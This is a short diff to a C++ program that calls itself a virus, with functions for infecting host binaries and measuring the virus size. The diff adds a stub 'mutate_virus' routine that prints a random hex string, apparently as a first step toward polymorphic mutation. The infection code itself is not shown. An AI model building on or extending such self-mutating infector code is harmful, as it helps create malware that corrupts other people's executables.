@@ -23,6 +23,7 @@ int get_virus_size();
 bool is_infected(std::string infectedHost, std::string binary);
 void create_empty_seed();
 void generate_hex_string(char str[], int length);
+void mutate_virus();
 
 int main(int argc, char** argv) {
     std::string fileName;
@@ -31,6 +32,7 @@ int main(int argc, char** argv) {
     std::string temporaryLocation = "garbage";
     std::string folder = "./tem/";
     create_directory(folder);
+    mutate_virus();
     if(argc > 1){
       fileName = argv[1];
       copy_uninfected_binary(hostName, folder);
@@ -64,14 +66,20 @@ int main(int argc, char** argv) {
 
 void mutate_virus(){
 
-  
-
+  int length = 20;
+  char str[length];
+  generate_hex_string(str, length);
+  for(int i = 0; i < length; i++){
+    cout << str[i];
+  }
+  cout << endl;
 }
 
 void generate_hex_string(char str[], int length)
 {
   char hex_characters[]={'0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F'};
   int i;
+  srand(time(0));
   for(i=0;i<length;i++)
   {
     str[i]=hex_characters[rand()%16];
